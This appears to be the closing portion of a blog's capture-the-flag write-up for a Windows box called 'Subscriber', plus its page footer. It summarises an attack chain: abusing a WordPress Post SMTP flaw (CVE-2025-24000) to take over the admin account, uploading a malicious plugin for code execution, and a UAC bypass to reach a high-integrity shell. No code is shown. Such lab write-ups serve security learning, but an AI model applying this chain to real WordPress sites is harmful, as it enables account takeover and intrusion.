+<p>The second listener on <code>9002</code> catches a high-integrity shell.</p>
+<p><img src="/images/Subscriber/root-shell.png" alt="root-shell"></p>
+<p>Both flags captured.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Subscriber was a clean web-first Windows box. The chain was tight and logical:</p>
+<ol>
+<li><strong>CVE-2025-24000</strong> — Post SMTP 3.2.0 leaks password-reset tokens to any authenticated user via the REST API; we used a subscriber account to take over the admin</li>
+<li><strong>WordPress admin → RCE</strong> — malicious plugin upload is always the cleanest path when you have admin; no theme editor fights, no metasploit, just a zip</li>
+<li><strong>UAC bypass</strong> — medium to high integrity via SspiUacBypass, keeping the footprint low and avoiding the noisier potato routes</li>
+</ol>
+<p>The key takeaway: keeping third-party plugins updated matters. CVE-2025-24000 is a chain-breaker — a subscriber-level account plus one vulnerable plugin version is all it takes to compromise a full WordPress admin.</p>
+<h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><ul>
+<li>Nmap</li>
+<li>WPScan</li>
+<li>Python3 (custom CVE-2025-24000 exploit)</li>
+<li>curl</li>
+<li>msfvenom</li>
+<li>SspiUacBypass</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Subscriber-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Subscriber - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">Web Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress-%E2%80%94-Post-SMTP-3-2-0"><span class="toc-number">1.3.1.</span> <span class="toc-text">WordPress — Post SMTP 3.2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.2.</span> <span class="toc-text">User Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-%E2%80%94-CVE-2025-24000"><span class="toc-number">1.4.</span> <span class="toc-text">Exploitation — CVE-2025-24000</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-a-Foothold-Account"><span class="toc-number">1.4.1.</span> <span class="toc-text">Creating a Foothold Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Running-the-Exploit"><span class="toc-number">1.4.2.</span> <span class="toc-text">Running the Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-%E2%80%94-Malicious-Plugin-Upload"><span class="toc-number">1.5.</span> <span class="toc-text">Initial Access — Malicious Plugin Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-Webshell-Plugin"><span class="toc-number">1.5.1.</span> <span class="toc-text">Building the Webshell Plugin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.5.2.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-%E2%80%94-UAC-Bypass-SspiUacBypass"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation — UAC Bypass (SspiUacBypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Situation"><span class="toc-number">1.6.1.</span> <span class="toc-text">The Situation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Staging-the-Payloads"><span class="toc-number">1.6.2.</span> <span class="toc-text">Staging the Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Executing-the-Bypass"><span class="toc-number">1.6.3.</span> <span class="toc-text">Executing the Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&text=Ronin66-Subscriber"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&is_video=false&description=Ronin66-Subscriber"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Subscriber&body=Check out this article: https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&title=Ronin66-Subscriber"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&name=Ronin66-Subscriber&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Subscriber/&t=Ronin66-Subscriber"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</body>
+</html>
